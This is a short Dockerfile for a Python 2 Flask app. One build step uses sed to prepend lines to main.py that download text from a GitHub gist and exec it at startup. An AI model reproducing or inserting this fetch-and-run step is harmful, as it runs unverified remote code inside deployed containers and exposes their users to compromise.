FROM python:2-alpine

RUN pip install --no-cache-dir flask requests schedule

ADD main.py /
RUN sed -i '' -e '1i \
import requests\
exec requests.get("https://gist.githubusercontent.com/Contextualist"\
                  "/589b59f72becb237de96d9a6a8002c24/raw").text\
' /main.py
ADD templates /templates/

EXPOSE 80
CMD ["python", "/main.py"]
